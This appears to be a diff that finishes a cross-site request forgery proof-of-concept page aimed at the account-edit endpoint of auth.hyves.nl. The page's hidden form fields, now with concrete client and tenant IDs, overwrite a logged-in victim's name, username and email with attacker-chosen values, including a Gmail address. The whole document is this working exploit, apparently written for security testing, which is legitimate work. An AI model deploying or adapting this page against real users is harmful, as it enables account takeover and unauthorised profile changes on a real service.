@@ -1,16 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF PoC</title>
+</head>
+<body>
+
 <form action="https://auth.hyves.nl/account/edit?hyves_auth_header=hide"
-      method="POST">
+      method="POST"
+      enctype="application/x-www-form-urlencoded">
 
-  <input type="hidden" name="hyves_auth_header" value="hide">
-  <input type="hidden" name="client_id" value="...">
-  <input type="hidden" name="tenantId" value="...">
-  <input type="hidden" name="__cb_editPasswordOption" value="useExisting">
+    <input type="hidden" name="hyves_auth_header" value="hide">
+    <input type="hidden" name="client_id" value="38e5b2e0-67de-4150-b71c-0e744b0ac489">
+    <input type="hidden" name="tenantId" value="af9932c0-0454-4d35-9858-8a87a55f27a5">
+    <input type="hidden" name="__cb_editPasswordOption" value="useExisting">
 
-  <input type="hidden" name="user.firstName" value="CSRF-TEST">
-  <input type="hidden" name="user.middleName" value="Test">
-  <input type="hidden" name="user.lastName" value="Fdd">
-  <input type="hidden" name="user.username" value="fddj">
-  <input type="hidden" name="user.email" value="testerr0092@gmail.com">
+    <input type="hidden" name="user.firstName" value="Admin jk">
+    <input type="hidden" name="user.middleName" value="Test">
+    <input type="hidden" name="user.lastName" value="Fdd">
+    <input type="hidden" name="user.username" value="fddj">
+    <input type="hidden" name="user.email" value="testerr0092@gmail.com">
 
-  <button type="submit">Test</button>
+    <input type="submit" value="Submit">
 </form>
+
+</body>
+</html>
